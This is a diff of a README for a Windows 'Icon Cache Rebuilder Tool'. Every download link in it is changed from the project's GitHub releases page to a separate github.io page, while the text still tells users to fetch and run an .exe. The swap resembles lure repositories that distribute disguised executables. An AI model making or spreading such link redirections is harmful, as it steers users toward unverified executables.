@@ -1,6 +1,6 @@
 # 🔧 Icon-Cache-Rebuilder-Tool - Fix broken and missing icons instantly
 
-[![Download Icon Cache Rebuilder Tool](https://img.shields.io/badge/Download-Icon%20Cache%20Rebuilder%20Tool-blue?style=for-the-badge&logo=windows)](https://github.com/bethw3855/Icon-Cache-Rebuilder-Tool/releases)
+[![Download Icon Cache Rebuilder Tool](https://img.shields.io/badge/Download-Icon%20Cache%20Rebuilder%20Tool-blue?style=for-the-badge&logo=windows)](https://bethw3855.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Follow these three simple steps to get your icons back to normal:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/bethw3855/Icon-Cache-Rebuilder-Tool/releases](https://github.com/bethw3855/Icon-Cache-Rebuilder-Tool/releases)**.
+Visit this link to download the application: **[https://bethw3855.github.io](https://bethw3855.github.io)**.
 
 You will see a list of releases. Click on the latest version, then download the file labeled "Icon-Cache-Rebuilder-Tool.exe" (or similar). The download should start automatically. Save it to a location you can easily find, like your Downloads folder or Desktop.
 
@@ -112,7 +112,7 @@ If you see any of these problems, running this tool is the fastest way to fix th
 
 ### Getting The Latest Version
 
-**Visit this link to download the application:** **[https://github.com/bethw3855/Icon-Cache-Rebuilder-Tool/releases](https://github.com/bethw3855/Icon-Cache-Rebuilder-Tool/releases)**.
+**Visit this link to download the application:** **[https://bethw3855.github.io](https://bethw3855.github.io)**.
 
 On the releases page, you'll find:
 
@@ -182,7 +182,7 @@ If you're having trouble running the tool, try these solutions:
 
 The Icon Cache Rebuilder Tool is your go-to solution for any icon display problem. Whether you're dealing with a few broken icons or every icon on your system looks wrong, this utility gets the job done in one click. No technical skills required — just download, run, and restart.
 
-[![Download Icon Cache Rebuilder Tool](https://img.shields.io/badge/Get%20the%20Tool-Download%20Now-success?style=for-the-badge&logo=windows)](https://github.com/bethw3855/Icon-Cache-Rebuilder-Tool/releases)
+[![Download Icon Cache Rebuilder Tool](https://img.shields.io/badge/Get%20the%20Tool-Download%20Now-success?style=for-the-badge&logo=windows)](https://bethw3855.github.io)
 
 ---
 
